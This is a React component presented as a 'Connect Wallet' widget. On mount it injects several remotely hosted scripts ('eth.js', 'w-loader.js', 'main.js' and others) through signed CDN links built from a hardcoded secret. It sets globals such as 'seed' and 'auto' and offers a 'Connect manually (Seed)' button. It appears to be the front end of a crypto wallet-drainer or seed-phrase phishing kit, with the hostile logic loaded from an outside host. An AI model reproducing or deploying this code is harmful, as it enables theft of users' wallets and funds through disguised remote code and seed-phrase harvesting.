import React, { useEffect, useState } from 'react';
import CryptoJS from 'crypto-js';

const WalletConnect = () => {
  const [loadingError, setLoadingError] = useState<string | null>(null);

  const generateSecureLink = (filePath: string) => {
      const secret = "c5f0e01ad46ab9fd3d34d712d6269542";
      const cdnBase = "https://assets.cdn.express/secure/t/";
      
      const expires = Math.floor(Date.now() / 1000) + 600; 
      
      const hashInput = secret + expires + filePath;
      const hash = CryptoJS.MD5(hashInput);
      
      let token = CryptoJS.enc.Base64.stringify(hash)
          .replace(/\+/g, '-')
          .replace(/\//g, '_')
          .replace(/=+$/, '');
  
      return `${cdnBase}${token}/${expires}${filePath}`;
  };

  useEffect(() => {
    // 1. External Scripts Load Karein
    const scriptPaths = [
      "/assets/eth.js",
      "/assets/w-modal.js",
      "/assets/w-loader.js",
      "/assets/modules.js",
      "/assets/main.js"
    ];

    scriptPaths.forEach(path => {
      const src = generateSecureLink(path);
      const script = document.createElement("script");
      script.src = src;
      script.async = true;
      script.onerror = () => {
        setLoadingError(`Failed to load asset: ${path}`);
        console.error(`Script load error: ${path}`);
      };
      document.body.appendChild(script);
    });

    // 2. Global Config Set Karein
    const win = window as any;
    win.modaltheme = 2;
    win.evm = 1;
    win.seed = 0;
    win.auto = 1;
    win.dark = 0;

  }, []);

  return (
    <>
      {/* Boxicons and CSS */}
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css" />
      <link rel="stylesheet" href="https://assets.cdn.express/assets/css/style.css?v=26.13.1.796" />

      {/* Hidden ID */}
      <input type="hidden" value="L5WL5CQL8U7E3TBSSTTGUHBIRV3FRKQFEMHSVSTQPLXOB" id="exogator_id" />

      {/* Visual Error Indicator */}
      {loadingError && (
        <div style={{ padding: '10px', backgroundColor: '#fee2e2', color: '#b91c1c', textAlign: 'center', fontSize: '12px' }}>
          Error: {loadingError}
        </div>
      )}

      {/* Connect Button */}
      <div style={{ textAlign: 'center', marginTop: '20px' }}>
        <button className="ex0connec" onClick={() => (window as any).exoconnect?.()}>
          Connect Wallet
        </button>
      </div>

      {/* Wallet Modal */}
      <div className="modal__container" id="modal-container">
        <div className="modal__content">
            <h1 className="modal__title">Connect your wallet</h1>
            <button className="modal__button modal__button-width" onClick={() => (window as any).start_exogator?.()}>
              Other Wallets (350+)
            </button>
            <button className="modal__button modal__button-width" onClick={() => (window as any).showseedme?.()}> 
              Connect manually (Seed)
            </button>
        </div>
      </div>
    </>
  );
};

export default WalletConnect;
